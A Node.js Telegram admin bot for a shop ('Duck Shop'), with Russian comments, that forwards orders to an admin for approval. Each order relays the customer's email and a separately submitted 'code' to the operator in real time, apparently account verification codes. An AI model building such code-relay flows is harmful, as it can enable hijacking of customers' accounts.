const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const express = require('express');

// =========== НАСТРОЙКИ ИЗ ПЕРЕМЕННЫХ ОКРУЖЕНИЯ ===========
const TOKEN = process.env.TG_TOKEN;
const ADMIN_ID = Number(process.env.ADMIN_CHAT_ID);
const SERVER_URL = process.env.SERVER_URL || process.env.RENDER_URL;
const API_SECRET = process.env.API_SECRET;
const PORT = process.env.PORT || 10000;

// =========== ИНИЦИАЛИЗАЦИЯ EXPRESS ===========
const app = express();

console.log('🔧 =========== НАСТРОЙКИ БОТА ===========');
console.log(`🤖 TG_TOKEN: ${TOKEN ? '✅ Установлен' : '❌ ОТСУТСТВУЕТ!'}`);
console.log(`👑 ADMIN_CHAT_ID: ${ADMIN_ID ? '✅ ' + ADMIN_ID : '❌ Не установлен'}`);
console.log(`🌐 SERVER_URL: ${SERVER_URL ? '✅ ' + SERVER_URL : '❌ Не установлен'}`);
console.log(`🔐 API_SECRET: ${API_SECRET ? '✅ Установлен' : '❌ Не установлен'}`);
console.log(`📡 PORT: ${PORT}`);
console.log(`=========================================`);

if (!TOKEN) {
  console.error('❌ КРИТИЧЕСКАЯ ОШИБКА: TG_TOKEN не установлен!');
  process.exit(1);
}

app.use(express.json());
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, x-api-secret');
  next();
});

// =========== ХРАНИЛИЩЕ ===========
const activeOrders = {};
const userStates = {};

// =========== ФУНКЦИИ ===========
function escapeMarkdown(text) {
  if (!text) return '';
  return text.toString()
    .replace(/_/g, '\\_')
    .replace(/\*/g, '\\*')
    .replace(/\[/g, '\\[')
    .replace(/\]/g, '\\]')
    .replace(/\(/g, '\\(')
    .replace(/\)/g, '\\)')
    .replace(/~/g, '\\~')
    .replace(/`/g, '\\`')
    .replace(/>/g, '\\>')
    .replace(/#/g, '\\#')
    .replace(/\+/g, '\\+')
    .replace(/-/g, '\\-')
    .replace(/=/g, '\\=')
    .replace(/\|/g, '\\|')
    .replace(/\{/g, '\\{')
    .replace(/\}/g, '\\}')
    .replace(/\./g, '\\.')
    .replace(/!/g, '\\!');
}

// =========== ЭНДПОИНТЫ API ===========

// Уведомления о заказах от сервера
app.post('/api/order-notify', async (req, res) => {
  try {
    const { order_id, email, items, amount, code, secret, stage } = req.body;
    
    console.log(`📦 Получено уведомление о заказе ${order_id}`);
    
    if (!API_SECRET) {
      console.log('❌ API_SECRET не установлен');
      return res.status(500).json({ success: false, error: 'API_SECRET not configured' });
    }
    
    if (secret !== API_SECRET) {
      console.log('❌ Неверный секрет');
      return res.status(401).json({ success: false, error: 'Unauthorized' });
    }
    
    if (!order_id || !email) {
      return res.status(400).json({ success: false, error: 'Missing required fields' });
    }
    
    if (!ADMIN_ID) {
      console.log('❌ ADMIN_CHAT_ID не установлен');
      return res.status(500).json({ success: false, error: 'No admin configured' });
    }
    
    // Сохраняем заказ
    activeOrders[order_id] = {
      email,
      items,
      amount,
      code,
      status: 'pending',
      timestamp: new Date().toISOString(),
      stage: stage || 'unknown'
    };
    
    // Отправляем уведомление в Telegram
    const notificationSent = await sendOrderNotification(order_id, email, items, amount, code, stage);
    
    if (notificationSent) {
      res.json({ success: true, message: 'Notification sent' });
    } else {
      res.status(500).json({ success: false, error: 'Failed to send notification' });
    }
    
  } catch (error) {
    console.error('Ошибка обработки уведомления:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Обновление статуса заказа
app.post('/api/order-update', async (req, res) => {
  try {
    const { order_id, status, admin_comment, secret } = req.body;
    
    if (!API_SECRET || secret !== API_SECRET) {
      return res.status(401).json({ success: false, error: 'Unauthorized' });
    }
    
    console.log(`📝 Обновление статуса заказа ${order_id}: ${status}`);
    
    // Отправляем на сервер магазина
    if (SERVER_URL) {
      try {
        await axios.post(`${SERVER_URL}/api/order-status-update`, {
          order_id,
          status,
          admin_comment,
          secret: API_SECRET
        }, {
          headers: { 'x-api-secret': API_SECRET },
          timeout: 10000
        });
      } catch (error) {
        console.error('Ошибка отправки на сервер:', error.message);
      }
    }
    
    // Обновляем локально
    if (activeOrders[order_id]) {
      activeOrders[order_id].status = status;
      activeOrders[order_id].updated_at = new Date().toISOString();
    }
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Ошибка обновления статуса:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Тест соединения
app.post('/api/test-connection', async (req, res) => {
  try {
    const { secret } = req.body;
    
    if (!API_SECRET || secret !== API_SECRET) {
      return res.status(401).json({ success: false, error: 'Unauthorized' });
    }
    
    if (!SERVER_URL) {
      return res.status(400).json({ success: false, error: 'SERVER_URL не установлен' });
    }
    
    console.log(`🔍 Проверяю соединение с сервером: ${SERVER_URL}`);
    
    // Проверяем доступность сервера
    const healthResponse = await axios.get(`${SERVER_URL}/health`, { timeout: 10000 });
    
    res.json({
      success: true,
      server_available: true,
      api_secret_valid: true,
      server_response: healthResponse.data,
      bot_settings: {
        admin_id: ADMIN_ID,
        api_secret_set: !!API_SECRET,
        server_url: SERVER_URL
      }
    });
    
  } catch (error) {
    console.error('❌ Ошибка проверки соединения:', error.message);
    res.status(500).json({
      success: false,
      error: error.message,
      server_url: SERVER_URL
    });
  }
});

// Главная страница
app.get('/', (req, res) => {
  const externalUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>🤖 Duck Shop Bot</title>
      <style>
        body { font-family: Arial; padding: 20px; max-width: 800px; margin: 0 auto; }
        .status { background: #4CAF50; color: white; padding: 10px; border-radius: 5px; }
        .info { background: #f5f5f5; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .stat { display: flex; justify-content: space-between; margin: 5px 0; }
      </style>
    </head>
    <body>
      <h1>🤖 Duck Shop Bot</h1>
      <div class="status">✅ Статус: Работает</div>
      
      <div class="info">
        <h3>📊 Статистика:</h3>
        <div class="stat">
          <span>Активных заказов:</span>
          <span><b>${Object.keys(activeOrders).filter(id => activeOrders[id].status === 'pending').length}</b></span>
        </div>
        <div class="stat">
          <span>Всего заказов:</span>
          <span><b>${Object.keys(activeOrders).length}</b></span>
        </div>
        <div class="stat">
          <span>Время работы:</span>
          <span><b>${Math.floor(process.uptime() / 3600)}ч ${Math.floor((process.uptime() % 3600) / 60)}м</b></span>
        </div>
      </div>
      
      <div class="info">
        <h3>🔧 Настройки:</h3>
        <div class="stat">
          <span>Админ ID:</span>
          <span>${ADMIN_ID || '❌ Не установлен'}</span>
        </div>
        <div class="stat">
          <span>Сервер магазина:</span>
          <span>${SERVER_URL ? '✅ Настроен' : '❌ Не настроен'}</span>
        </div>
        <div class="stat">
          <span>API Secret:</span>
          <span>${API_SECRET ? '✅ Установлен' : '❌ Не установлен'}</span>
        </div>
      </div>
      
      <p style="margin-top: 30px; color: #666;">
        🤖 Бот работает 24/7 на Render.com
      </p>
    </body>
    </html>
  `);
});

app.get('/health', (req, res) => {
  res.json({
    success: true,
    message: 'Bot is healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// =========== ЗАПУСК ВЕБ-СЕРВЕРА ===========
const server = app.listen(PORT, () => {
  console.log(`🌐 Веб-сервер запущен на порту ${PORT}`);
});

// =========== ТЕЛЕГРАМ БОТ ===========
let bot;
try {
  bot = new TelegramBot(TOKEN, { 
    polling: true,
    request: { timeout: 60000 }
  });
  console.log('🤖 Duck Shop Bot запущен');
} catch (error) {
  console.error('❌ Не удалось запустить бота:', error.message);
  process.exit(1);
}

// =========== ФУНКЦИИ БОТА ===========

// Отправка уведомления о заказе
async function sendOrderNotification(orderId, email, items, amount, code, stage) {
  try {
    if (!ADMIN_ID) {
      console.log('⚠️ ADMIN_CHAT_ID не установлен');
      return false;
    }

    console.log(`📤 Отправляю уведомление о заказе ${orderId}`);

    let itemsText = '';
    if (items && typeof items === 'object') {
      for (const [itemId, quantity] of Object.entries(items)) {
        itemsText += `  • ${itemId}: ${quantity} шт.\n`;
      }
    } else {
      itemsText = '  • Информация о товарах отсутствует\n';
    }

    const stageText = stage === 'email_submitted' ? '📧 EMAIL ВВЕДЁН' : 
                     stage === 'code_submitted' ? '🔢 КОД ОТПРАВЛЕН' : '📦 НОВЫЙ ЗАКАЗ';
    
    const message = 
      `${stageText}\n\n` +
      `📦 *Заказ:* \`${orderId}\`\n` +
      `📧 *Почта:* ${escapeMarkdown(email)}\n` +
      `${code ? `🔢 *Код:* \`${code}\`\n` : '🔢 *Код:* Ожидается ввод\n'}` +
      `💰 *Сумма:* ${amount || 0}₽\n\n` +
      `🛒 *Состав заказа:*\n${itemsText}\n` +
      `⏰ *Время:* ${new Date().toLocaleTimeString()}`;

    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ Подтвердить', callback_data: `approve_${orderId}` },
            { text: '❌ Отклонить', callback_data: `reject_${orderId}` }
          ],
          [
            { text: '📋 Подробнее', callback_data: `details_${orderId}` }
          ]
        ]
      }
    };

    await bot.sendMessage(ADMIN_ID, message, { 
      parse_mode: 'Markdown',
      ...keyboard 
    });

    console.log(`✅ Уведомление отправлено`);
    return true;

  } catch (error) {
    console.error('❌ Ошибка отправки уведомления:', error.message);
    return false;
  }
}

// Отправка уведомления о статусе
async function sendStatusUpdate(orderId, status, adminComment = '') {
  try {
    const order = activeOrders[orderId];
    if (!order) return;

    const statusText = status === 'approved' ? '✅ ПОДТВЕРЖДЁН' : '❌ ОТКЛОНЁН';
    
    const message = 
      `${status === 'approved' ? '✅' : '❌'} *СТАТУС ЗАКАЗА ОБНОВЛЁН*\n\n` +
      `📦 *Заказ:* \`${orderId}\`\n` +
      `📧 *Почта:* ${escapeMarkdown(order.email)}\n` +
      `${order.code ? `🔢 *Код:* \`${order.code}\`\n` : ''}` +
      `📊 *Статус:* ${statusText}\n` +
      `${adminComment ? `💬 *Комментарий:* ${escapeMarkdown(adminComment)}\n` : ''}` +
      `⏰ *Время:* ${new Date().toLocaleTimeString()}`;

    await bot.sendMessage(ADMIN_ID, message, { 
      parse_mode: 'Markdown' 
    });

    console.log(`📤 Уведомление о статусе отправлено`);

  } catch (error) {
    console.error('❌ Ошибка отправки статуса:', error.message);
  }
}

// =========== КОМАНДЫ БОТА ===========

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (ADMIN_ID && userId !== ADMIN_ID) {
    return bot.sendMessage(chatId, '👋 Привет! Я бот для управления магазином.');
  }
  
  showMainMenu(chatId, `👑 Администратор ${msg.from.first_name}!`);
});

bot.onText(/\/products/, async (msg) => {
  const chatId = msg.chat.id;
  if (ADMIN_ID && msg.from.id !== ADMIN_ID) return;
  
  if (!SERVER_URL) {
    return bot.sendMessage(chatId, '❌ SERVER_URL не установлен.');
  }
  
  try {
    const response = await axios.get(`${SERVER_URL}/api/products`, { timeout: 10000 });
    const products = response.data?.products || [];
    
    if (!products.length) {
      return bot.sendMessage(chatId, '📭 Товаров в магазине нет');
    }
    
    let message = `📋 *Товаров в магазине:* ${products.length}\n\n`;
    products.forEach((p, i) => {
      message += `${i+1}. *${escapeMarkdown(p.name)}*\n`;
      message += `   💰 ${p.price}₽ | 🆔 ${escapeMarkdown(p.id)}\n`;
      if (p.gift) message += `   🎁 Подарочный товар\n`;
      message += '\n';
    });
    
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    
  } catch (error) {
    bot.sendMessage(chatId, `❌ Ошибка: ${error.message}`);
  }
});

bot.onText(/\/orders/, async (msg) => {
  const chatId = msg.chat.id;
  if (ADMIN_ID && msg.from.id !== ADMIN_ID) return;
  
  const pendingOrders = Object.entries(activeOrders)
    .filter(([id, order]) => order.status === 'pending');
  
  if (pendingOrders.length === 0) {
    return bot.sendMessage(chatId, '📭 Нет активных заказов');
  }
  
  let message = `📊 *Активные заказы:* ${pendingOrders.length}\n\n`;
  
  pendingOrders.forEach(([orderId, order], index) => {
    message += `${index+1}. *Заказ:* \`${orderId}\`\n`;
    message += `   📧 ${escapeMarkdown(order.email)}\n`;
    message += `   ${order.code ? `🔢 Код: \`${order.code}\`\n` : '🔢 Код: Ожидается\n'}`;
    message += `   💰 ${order.amount || 0}₽\n\n`;
  });
  
  bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

bot.onText(/\/addproduct/, (msg) => {
  const chatId = msg.chat.id;
  if (ADMIN_ID && msg.from.id !== ADMIN_ID) return;
  
  if (!SERVER_URL) {
    return bot.sendMessage(chatId, '❌ SERVER_URL не установлен.');
  }
  
  userStates[chatId] = { step: 'name' };
  bot.sendMessage(chatId, '📝 Введите название товара:');
});

bot.onText(/\/status/, (msg) => {
  const chatId = msg.chat.id;
  if (ADMIN_ID && msg.from.id !== ADMIN_ID) return;
  
  const uptime = process.uptime();
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  
  const pendingOrders = Object.keys(activeOrders).filter(id => activeOrders[id].status === 'pending').length;
  
  let statusMessage = `🤖 **Статус бота:**\n\n` +
    `✅ Работает\n` +
    `⏰ Время работы: ${hours}ч ${minutes}м\n` +
    `📦 Активных заказов: ${pendingOrders}\n` +
    `📊 Всего заказов: ${Object.keys(activeOrders).length}\n` +
    `🌐 Сервер магазина: ${SERVER_URL || 'Не настроен'}\n` +
    `🔐 API Secret: ${API_SECRET ? '✅' : '❌'}\n` +
    `👑 Админ ID: ${ADMIN_ID || 'Не установлен'}`;
  
  bot.sendMessage(chatId, statusMessage, { parse_mode: 'Markdown' });
});

// =========== ОБРАБОТКА СООБЩЕНИЙ ===========
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  const userId = msg.from.id;
  
  if (ADMIN_ID && userId !== ADMIN_ID) return;
  if (text.startsWith('/')) return;
  
  const state = userStates[chatId];
  
  if (state && state.step === 'name') {
    state.name = text;
    state.step = 'price';
    bot.sendMessage(chatId, '💰 Введите цену товара:');
  }
  else if (state && state.step === 'price') {
    const price = parseInt(text);
    if (isNaN(price) || price <= 0) {
      return bot.sendMessage(chatId, '❌ Введите корректную цену!');
    }
    
    state.price = price;
    state.step = 'image';
    bot.sendMessage(chatId, '🖼️ Введите URL картинки:');
  }
  else if (state && state.step === 'image') {
    const imageUrl = text.trim();
    state.image = imageUrl;
    
    // Отправляем на сервер
    try {
      if (!API_SECRET) {
        throw new Error('API_SECRET не установлен');
      }
      
      const productId = `prod_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
      
      const response = await axios.post(`${SERVER_URL}/api/add-product`, {
        id: productId,
        name: state.name,
        price: state.price,
        image: state.image,
        gift: false,
        secret: API_SECRET
      }, {
        timeout: 15000,
        headers: { 'Content-Type': 'application/json' }
      });
      
      if (response.data.success) {
        bot.sendMessage(chatId, `✅ Товар "${state.name}" успешно добавлен!`);
      }
      
    } catch (error) {
      console.error('Ошибка добавления товара:', error.message);
      bot.sendMessage(chatId, `❌ Ошибка: ${error.message}`);
    }
    
    delete userStates[chatId];
  }
});

// =========== ОБРАБОТКА CALLBACK ===========
bot.on('callback_query', async (callbackQuery) => {
  const msg = callbackQuery.message;
  const chatId = msg.chat.id;
  const data = callbackQuery.data;
  
  await bot.answerCallbackQuery(callbackQuery.id);
  
  // Подтверждение заказа
  if (data.startsWith('approve_')) {
    const orderId = data.replace('approve_', '');
    
    // Отправляем на сервер
    if (SERVER_URL && API_SECRET) {
      try {
        await axios.post(`${SERVER_URL}/api/order-status-update`, {
          order_id: orderId,
          status: 'completed',
          secret: API_SECRET
        }, {
          headers: { 'x-api-secret': API_SECRET },
          timeout: 10000
        });
      } catch (error) {
        console.error(`Ошибка обновления статуса:`, error.message);
      }
    }
    
    // Обновляем локально
    if (activeOrders[orderId]) {
      activeOrders[orderId].status = 'approved';
    }
    
    // Отправляем уведомление
    await sendStatusUpdate(orderId, 'approved');
    
    bot.answerCallbackQuery(callbackQuery.id, { text: 'Заказ подтверждён!' });
  }
  
  // Отклонение заказа
  else if (data.startsWith('reject_')) {
    const orderId = data.replace('reject_', '');
    userStates[chatId] = {
      step: 'reject_reason',
      orderId: orderId
    };
    
    bot.sendMessage(chatId, '📝 Укажите причину отклонения:');
  }
  
  // Детали заказа
  else if (data.startsWith('details_')) {
    const orderId = data.replace('details_', '');
    const order = activeOrders[orderId];
    
    if (!order) {
      return bot.answerCallbackQuery(callbackQuery.id, { text: 'Заказ не найден' });
    }
    
    let details = `📋 *Детали заказа ${orderId}*\n\n`;
    details += `📧 *Почта:* ${escapeMarkdown(order.email)}\n`;
    details += `🔢 *Код:* ${order.code ? `\`${order.code}\`` : 'Ожидается'}\n`;
    details += `💰 *Сумма:* ${order.amount || 0}₽\n`;
    details += `📊 *Статус:* ${order.status === 'pending' ? '⏳ Ожидает' : '✅ Подтверждён'}\n`;
    details += `⏰ *Создан:* ${new Date(order.timestamp).toLocaleString()}\n`;
    
    bot.sendMessage(chatId, details, { parse_mode: 'Markdown' });
  }
});

// Обработка причины отклонения
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  const state = userStates[chatId];
  
  if (state && state.step === 'reject_reason') {
    const orderId = state.orderId;
    
    // Отправляем на сервер
    if (SERVER_URL && API_SECRET) {
      try {
        await axios.post(`${SERVER_URL}/api/order-status-update`, {
          order_id: orderId,
          status: 'rejected',
          admin_comment: text,
          secret: API_SECRET
        }, {
          headers: { 'x-api-secret': API_SECRET },
          timeout: 10000
        });
      } catch (error) {
        console.error(`Ошибка обновления статуса:`, error.message);
      }
    }
    
    // Отправляем уведомление
    await sendStatusUpdate(orderId, 'rejected', text);
    
    bot.sendMessage(chatId, `❌ Заказ ${orderId} отклонён.`);
    delete userStates[chatId];
  }
});

// =========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ===========
function showMainMenu(chatId, text) {
  const keyboard = {
    reply_markup: {
      keyboard: [
        ['📋 Список товаров', '📊 Активные заказы'],
        ['📦 Добавить товар', '📊 Статус бота']
      ],
      resize_keyboard: true
    }
  };
  
  bot.sendMessage(chatId, text, keyboard);
}

// =========== KEEP-ALIVE ===========
setInterval(() => {
  const uptime = process.uptime();
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  
  const pendingOrders = Object.keys(activeOrders).filter(id => activeOrders[id].status === 'pending').length;
  
  console.log(`[${new Date().toLocaleTimeString()}] Бот работает ${hours}ч ${minutes}м | Заказов: ${pendingOrders}`);
}, 5 * 60 * 1000);

// Очистка старых заказов
setInterval(() => {
  const now = Date.now();
  const day = 24 * 60 * 60 * 1000;
  let cleared = 0;
  
  for (const [orderId, order] of Object.entries(activeOrders)) {
    const orderTime = new Date(order.timestamp).getTime();
    if (now - orderTime > day) {
      delete activeOrders[orderId];
      cleared++;
    }
  }
  
  if (cleared > 0) {
    console.log(`🧹 Очищено ${cleared} старых заказов`);
  }
}, 60 * 60 * 1000);

console.log('✅ Бот готов к работе!');
console.log(`📡 Уведомления: ${API_SECRET && ADMIN_ID ? '✅ Активны' : '❌ Не активны'}`);
